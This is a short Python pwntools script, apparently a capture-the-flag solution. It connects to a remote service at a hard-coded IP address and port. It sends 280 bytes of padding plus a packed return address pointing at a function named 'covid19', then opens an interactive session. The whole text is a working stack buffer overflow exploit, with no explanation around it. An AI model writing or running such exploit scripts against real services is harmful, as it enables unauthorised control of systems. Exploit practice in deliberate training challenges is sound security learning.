from pwn import *

r = remote("103.229.41.18", 5557)

covid19 = 0x00000000004011b6
payload = "A"*280 + p64(covid19)
r.sendline(payload)
r.interactive()